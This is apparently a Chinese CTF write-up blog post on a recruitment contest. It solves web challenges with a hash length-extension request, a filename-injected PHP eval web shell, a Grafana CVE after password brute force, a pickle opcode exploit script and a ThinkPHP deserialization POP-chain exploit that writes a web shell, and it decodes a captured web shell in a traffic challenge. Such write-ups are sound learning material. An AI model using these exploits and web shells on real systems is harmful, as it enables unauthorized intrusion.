---
title: SDPCSEC纳新赛3.0
date: 2026-03-28 21:20:41
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/69493c53c154427986d9eed9.png
categories: CTF
---
# web

## real_signin

提示有备份，直接扫一下目录，果然发现了index.php.bak

```php
<?php
$SECRET_KEY='xxxxxxxxxxxx'; # len($SECRET_KEY) = 12
function hashEncode($data) {
    global $SECRET_KEY;
    return md5($SECRET_KEY.$data);
}
include('flag.php');

$md5=$_POST['md5'];
$value=$_POST['value'];
if(isset($md5) && isset($value)) {
    echo(hashEncode('sdpc').'<br>');
    if(hashEncode($value)===$md5) {
        echo "yes, give you flag: ";
        echo $FLAG;
    }else{
        echo("no.");
    }
}
```

#### 非预期？

```
value=sdpc&md5=193a8f62eed8bd2bb6d07dbfd8579d34
```

直接就能出来，不知道是不是就是这样的

猜测应该想考哈希扩展

![image-20260328212742220](https://gitee.com/bobrocket/img/raw/master/image-20260328212742220.png)

```
value=sdpc%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%00%00%00%00%00%00%00abc&md5=fb7abb3b78411196d42c50c684596d22
```

![image-20260328212924400](https://gitee.com/bobrocket/img/raw/master/image-20260328212924400.png)

## 点墨染翰

上传头像只允许jpg和png，并且后端做了检查

查看历史页面的源码有一段比较可疑

```html
<h3>当前头像:</h3>
<div class="avatar-display">
<img src="uploads/b2e5b371c29c0e14_1774704522.png" alt="Current Avatar">
</div>
<div class="code-execution">7.png </div>
</div>
```

推测漏洞点在7.png上

上传文件名为 `<?php phpinfo();?>.png`成功读取，下面上马

`<?php @eval($_POST['pass']);?>.png`

![image-20260328213401437](https://gitee.com/bobrocket/img/raw/master/image-20260328213401437.png)

## real_Grafana

这个版本的grafana有CVE，但是需要用户名和密码，我们直接爆破一下

```
username:editor
password:editor123
```

下面直接打CVE-2024-9264

![image-20260328214027001](https://gitee.com/bobrocket/img/raw/master/image-20260328214027001.png)

## Y0u_@r3_n0t_Acc1oFl4g

**app.py**:

```python
from flask import Flask, request, 
session, render_template_string, url_for,
redirect
import pickle
import io
import sys
import base64
import random
import subprocess
from config import notAcc1oFl4g

app = Flask(__name__)

class RestrictedUnpickler(pickle.
Unpickler):
    def find_class(self, module, name):
        if module in ['config'] and "__" 
        not in name:
            return getattr(sys.modules
            [module], name)
        raise pickle.UnpicklingError("'%s.
        %s' not allowed" % (module, name))


def restricted_loads(s):
    """Helper function analogous to 
    pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO
    (s)).load()

@app.route('/')
def index():
    return render_template_string('Hello 
    Hacker')

@app.route('/secret')
def secret():
    info = request.args.get('param', '')
    if info is not '':
        x = base64.b64decode(info)
        User = restricted_loads(x)
    return render_template_string('oh you 
    find it')


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, 
    port=80)
```

**config.py**:

```python
notAcc1oFl4g={"Acc1oFl4g":"no"}

def backdoor(cmd):
    if notAcc1oFl4g["Acc1oFl4g"]=="yes":
        s=''.join(cmd)
        exec(s)
```

- /secret 路由接受 param 参数
- 参数经过 base64 解码后，传入 restricted_loads() 进行 pickle 反序列化

分析 RestrictedUnpickler 限制

```python
class RestrictedUnpickler(pickle.
Unpickler):
    def find_class(self, module, name):
        if module in ['config'] and "__" 
        not in name:
            return getattr(sys.modules
            [module], name)
        raise pickle.UnpicklingError("'%s.
        %s' not allowed" % (module, name))
```

**限制条件**:

1. 只能从 config 模块加载类/函数
2. 名称不能包含 \_\_（防止使用 _\_reduce\_\_、\_\_init__ 等魔术方法）

config.py 中存在一个 backdoor 函数：

```python
def backdoor(cmd):
    if notAcc1oFl4g["Acc1oFl4g"]=="yes":
        s=''.join(cmd)
        exec(s)
```

**关键点**:

- backdoor 函数可以执行任意 Python 代码
- 但需要 notAcc1oFl4g["Acc1oFl4g"]=="yes" 才能触发
- notAcc1oFl4g 是一个字典，初始值为 {"Acc1oFl4g":"no"}

**攻击思路**

利用 pickle 操作码：

1. 获取 config.notAcc1oFl4g 字典对象
2. 修改字典值：notAcc1oFl4g["Acc1oFl4g"] = "yes"
3. 获取 config.backdoor 函数
4. 调用 backdoor 执行任意代码

这里有一个叫pker的工具可以帮我们利用操作码，这里好像有python版本兼容问题，要放kali里面跑

```python
import sys

sys.path.insert(0, r'/home/kali/桌面/pker-master/')

from pker import cons

payload="""
a=GLOBAL('config','notAcc1oFl4g')
a['Acc1oFl4g'] = 'yes'
func=GLOBAL('config','backdoor')
func('raise Exception(open("/flag").read())')"""

payload = cons(payload)
print(payload)
```

由于这里没有回显，所以我们用异常抛出把flag吐出来

```python
import pickle
import base64
import requests

payload = b'cconfig\nnotAcc1oFl4g\np0\n0g0\nS\'Acc1oFl4g\'\nS\'yes\'\nscconfig\nbackdoor\np2\n0g2\n(S\'raise Exception(open("/flag").read())\'\ntR'

encoded = base64.b64encode(payload).decode()
print(f"Payload: {encoded}")

url = "http://175.27.251.122:35425/secret"
response = requests.get(url, params={"param": encoded})
print(f"Response: {response.text}")
```

![image-20260329094307881](https://gitee.com/bobrocket/img/raw/master/image-20260329094307881.png)

#### referer

[pickle反序列化漏洞基础知识与绕过简析-先知社区](https://xz.aliyun.com/news/13498)

## 超かぐや姫！

flask框架，邮箱的地方存在ssti，但是邮箱地址不让有小括号、中括号，试了双引号包裹貌似也不行，这样就不能执行命令了

后台应该是把config和request也删了，没法直接调用

```
{{lipsum.__globals__.os.sys.modules.flask.current_app.config}}
```

找到一条能读敏感信息的链子

![image-20260329172406361](https://gitee.com/bobrocket/img/raw/master/image-20260329172406361.png)

## thinking...

第一次做thinkphp，这里详细讲一下怎么找到漏洞以及怎么利用。我们先看一下目录结构，如何审计这个代码？

>如果只想快速审计一个 ThinkPHP 题，优先看这几个位置：
>
>  - application/route.php
>  - controller
>  - model
>  - public/index.php
>  - vendor 里有没有额外注册的路由或危险扩展

先看路由文件 attach/application/route.php，能立刻知道站点主要功能只有 3 个入口：

  - GET /designer 编辑文章
  - POST /preset/save 保存文章
  - GET /preset/preview/:id 查看文章

这里调用了看控制器 attach/application/index/controller/Theme.php，我们重点关注这里的save和preview

```php
public function save(Request $request)
    {
        $name     = trim((string) $request->post('name', 'Untitled board'));//标题
        $accent   = trim((string) $request->post('accent', '#294172'));//主题色
        $snapshot = trim((string) $request->post('snapshot', ''));//内容

        if ('' === $snapshot) {
            return $this->error('Legacy pack is required.');
        }

        if (!preg_match('/^#[0-9a-fA-F]{6}$/', $accent)) {
            $accent = '#294172';
        }

        $preset = new ThemePreset([ //新建了一个ThemePreset类
            'name'       => substr($name, 0, 48),
            'accent'     => $accent,
            'snapshot'   => $snapshot,//把文章内容直接塞进去了
            'created_at' => time(),
        ]);

        $preset->save();

        return $this->redirect(url('index/theme/preview', ['id' => $preset->id]));
    }
public function preview($id)
    {
        $preset = ThemePreset::get((int) $id);//通过 ThemePreset::get((int)$id) 再把记录取出来

        if (!$preset) {
            return $this->error('Preset not found.');
        }

        $renderer = new PreviewRenderer();
        $renderer->remember('preset-' . $preset->id, $preset->name);

        $layout  = $preset->snapshot;
        $summary = 'Legacy pack loaded.';
        $cards   = [];

        if (is_array($layout)) {
            if (!empty($layout['hero'])) {
                $summary = (string) $layout['hero'];
            }

            if (!empty($layout['blocks']) && is_array($layout['blocks'])) {
                foreach ($layout['blocks'] as $block) {
                    if (!is_array($block)) {
                        continue;
                    }

                    $cards[] = [
                        'label' => isset($block['label']) ? (string) $block['label'] : 'Panel',
                        'copy'  => isset($block['copy']) ? (string) $block['copy'] : 'No copy attached.',
                    ];
                }
            }
        }
```

我们接着去看类ThemePreset的定义

```php
class ThemePreset extends Model //继承基类Model
{
    protected $name = 'theme_preset';
    protected $type = [
        'snapshot' => 'serialize', //配置模型的字符转换规则，一眼高危
    ];
    protected $previewer;

    public function previewer()
    {
        return $this->previewer;
    }
}
```

我们去找基类Model，调用链是：

  - ThemePreset::get() 取模型
  - 模板或控制器访问 $preset->snapshot
  - 进入 Model::getAttr()
  - 看到字段类型是 serialize
  - 再进入 readTransform()
  - 最终执行 unserialize($value)

  所以业务逻辑被还原成了：

    1. 用户可控 snapshot
    2. 原样入库
    3. 之后读取时自动 unserialize

也就是说这里的业务层给了我们反序列化的入口，我们下一步需要去找POP链来利用这个漏洞，找到这样一篇文章，链子可以直接拿来用

[ThinkPHPv5.0.x反序列化利用链 - juanxincai017 - 博客园](https://www.cnblogs.com/Juanx1ncai/articles/19119628)

或者gpt也给我写了一个exp

```php
<?php
require 'attach/vendor/autoload.php';

function sp($obj, $class, $prop, $value) {  //强制编辑私有属性
    $r = new ReflectionProperty($class, $prop);
    $r->setAccessible(true);
    $r->setValue($obj, $value);
}

$w = (new ReflectionClass("think\\process\\pipes\\Windows"))->newInstanceWithoutConstructor();
$p = (new ReflectionClass("think\\model\\Pivot"))->newInstanceWithoutConstructor();
$h = (new ReflectionClass("think\\model\\relation\\HasOne"))->newInstanceWithoutConstructor();
$q = (new ReflectionClass("think\\db\\Query"))->newInstanceWithoutConstructor();
$o = (new ReflectionClass("think\\console\\Output"))->newInstanceWithoutConstructor();
$m = (new ReflectionClass("think\\session\\driver\\Memcached"))->newInstanceWithoutConstructor();
$f = (new ReflectionClass("think\\cache\\driver\\File"))->newInstanceWithoutConstructor();

sp($p, "think\\Model", "append", ["getError"]);
sp($p, "think\\Model", "error", $h);
sp($p, "think\\model\\Pivot", "parent", $o);

sp($h, "think\\model\\Relation", "query", $q);
sp($h, "think\\model\\Relation", "selfRelation", false);
sp($h, "think\\model\\relation\\OneToOne", "bindAttr", ["admin" => "admin"]);

sp($q, "think\\db\\Query", "model", $o);

sp($o, "think\\console\\Output", "styles", ["getAttr"]);
sp($o, "think\\console\\Output", "handle", $m);

sp($m, "think\\session\\driver\\Memcached", "handler", $f);
sp($m, "think\\session\\driver\\Memcached", "config", [
    "session_name" => "",
    "expire" => 3600
]);

sp($f, "think\\cache\\Driver", "options", [
    "expire" => 0,
    "cache_subdir" => false,
    "prefix" => "",
    "path" =>
        "php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php",
    "data_compress" => false
]);
sp($f, "think\\cache\\Driver", "tag", 1);

sp($w, "think\\process\\pipes\\Windows", "files", [$p]);

echo http_build_query([
    "name" => "probe1732",
    "accent" => "#294172",
    "snapshot" => serialize($w),
]);
```

总的来说大致流程如下

```
Windows::__destruct()-> file_exists($obj)-> Pivot::__toString()-> Model::toArray()-> HasOne / Query / Output-> Memcached::write()-> File::set()
```

不太好理解，我们重点关注一下它是怎么落地的

[Thinkphp5.0反序列化链在Windows下写文件的方法-先知社区](https://xz.aliyun.com/news/7053)

> 为什么最后文件名是 a.php3b58...php
>
> 因为 ThinkPHP 文件缓存不是直接写到 a.php，它还会自动追加缓存 key：
>
> $filename = $this->options['path'] . $name . '.php';
>
> 而触发 tag=1 后，第二次写入的 key 是：tag_ . md5(1)
>
> 再经过一层 md5，得到：3b58a9545013e88c7186db11bb158c44即a.php3b58a9545013e88c7186db11bb158c44.php
>

![image-20260418152437547](https://gitee.com/bobrocket/img/raw/master/image-20260418152437547.png)

# Misc

## easy_traffic

首先筛选http流量

![image-20260329145940199](https://gitee.com/bobrocket/img/raw/master/image-20260329145940199.png)

我们发现两个POST流量

第一个上传了1.zip，我们追踪tcp把压缩包保存，发现里面有flag.png但是需要密码解压

我们看第二个POST

![image-20260329150112668](https://gitee.com/bobrocket/img/raw/master/image-20260329150112668.png)

请求包的部分url解码，反转，base64解码得到一串代码

```php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='camellia';
$payloadName='payload';
$key='d2514888c140c3b6';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

我们用Python脚本解密响应包

```python
import base64
import gzip
import hashlib

# 从响应中提取的数据
response = "b467b82236edb9d3Lb45NDg4OGMxPvtN/Sz8zXj8e2XY3Tpj2fG+Kz9iNmQ=6d3a211d4d306f47"

# 分割各部分
prefix = response[:16]
b64_data = response[16:-16]
suffix = response[-16:]

# 验证 MD5
pass_key = "camellia" + "d2514888c140c3b6"
md5_hash = hashlib.md5(pass_key.encode()).hexdigest()
assert prefix == md5_hash[:16]
assert suffix == md5_hash[16:]

# Base64 解码
encrypted = base64.b64decode(b64_data)

# XOR 解密
key = "d2514888c140c3b6"
decrypted = bytearray()
for i, b in enumerate(encrypted):
    k = ord(key[(i + 1) & 15])
    decrypted.append(b ^ k)

# Gzip 解压
password = gzip.decompress(bytes(decrypted))
print(password)  # b'kskblzdjd'
```

得到kskblzdjd

这个就是压缩包的密码，我们得到了flag.png

![flag](https://gitee.com/bobrocket/img/raw/master/flag.png)

这个是汉信码，我们找一个在线网站

![image-20260329150857859](https://gitee.com/bobrocket/img/raw/master/image-20260329150857859.png)

